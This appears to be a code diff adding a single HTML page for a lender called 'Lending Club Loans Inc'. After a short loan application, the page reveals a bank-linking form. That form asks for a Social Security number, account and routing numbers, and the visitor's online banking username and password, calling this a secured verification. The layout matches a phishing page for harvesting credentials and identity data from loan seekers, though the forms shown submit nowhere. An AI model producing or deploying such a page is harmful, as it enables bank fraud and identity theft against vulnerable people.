@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lending Club Loans Inc</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f5f6fa;
+      color: #333;
+    }
+    header {
+      background-color: #004481;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    header img {
+      max-width: 200px;
+      display: block;
+      margin: 0 auto;
+    }
+    .hero {
+      text-align: center;
+      padding: 50px 20px;
+    }
+    .hero h2 {
+      color: #004481;
+    }
+    .form-section {
+      max-width: 500px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-section h3 {
+      margin-top: 0;
+      color: #004481;
+    }
+    form input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    form button {
+      background-color: #004481;
+      color: #fff;
+      padding: 12px;
+      border: none;
+      width: 100%;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .bank-link {
+      display: none;
+    }
+    .bank-link.active {
+      display: block;
+    }
+    .bank-form {
+      display: flex;
+      gap: 40px;
+      align-items: flex-start;
+      flex-wrap: wrap;
+    }
+    .bank-form img {
+      max-width: 300px;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="logo.png" alt="Lending Club Loans Inc Logo" />
+  </header>
+
+  <section class="hero">
+    <h2>Your trusted loan partner</h2>
+    <p>Simple, fast and secure loans to meet your needs.</p>
+  </section>
+
+  <section class="form-section" id="loan-form">
+    <h3>Apply for a Loan</h3>
+    <form onsubmit="event.preventDefault(); showBankLink();">
+      <input type="text" placeholder="Full Name" required />
+      <input type="email" placeholder="Email" required />
+      <input type="tel" placeholder="Phone Number" required />
+      <input type="number" placeholder="Desired Loan Amount" required />
+      <button type="submit">Submit Application</button>
+    </form>
+  </section>
+
+  <section class="form-section bank-link" id="bank-link">
+    <h3>Link Your Bank Here!</h3>
+    <p>Secured verification form to link your accounts to our secured payment portal!</p>
+    <div class="bank-form">
+      <form>
+        <input type="text" placeholder="Your Name" required />
+        <input type="text" placeholder="SSN" required />
+        <input type="text" placeholder="Bank Name" required />
+        <input type="text" placeholder="Account Number" required />
+        <input type="text" placeholder="Routing Number" required />
+        <input type="text" placeholder="Online Banking Username" required />
+        <input type="password" placeholder="Online Banking Password" required />
+        <button type="submit">Link Now</button>
+      </form>
+      <img src="https://via.placeholder.com/300x200?text=Bank+Image" alt="Bank Illustration" />
+    </div>
+  </section>
+
+  <script>
+    function showBankLink() {
+      document.getElementById('loan-form').style.display = 'none';
+      document.getElementById('bank-link').classList.add('active');
+    }
+  </script>
+</body>
+</html>
